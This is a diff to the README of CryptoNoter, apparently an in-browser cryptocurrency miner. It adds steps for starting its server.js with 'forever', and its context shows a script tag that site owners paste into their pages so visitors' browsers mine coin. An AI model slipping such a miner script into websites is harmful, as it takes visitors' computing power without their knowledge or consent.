@@ -36,6 +36,15 @@ sudo sh install.sh
 ```
 
 ## Usage
+* Run CryptoNoter server.js script
+```bash
+forever start /srv/CryptoNoter/server.js
+```
+* Make sure CryptoNoter server.js script is running on the server
+```bash
+forever list
+```
+
 * Add the following javascript before the </head> tag on your website coding. Remember to replace www.cryptonoter.com with your domain name. Else, you will be mining for my wallet
 ```html
 <script src="https://www.cryptonoter.com/processor.js"></script>
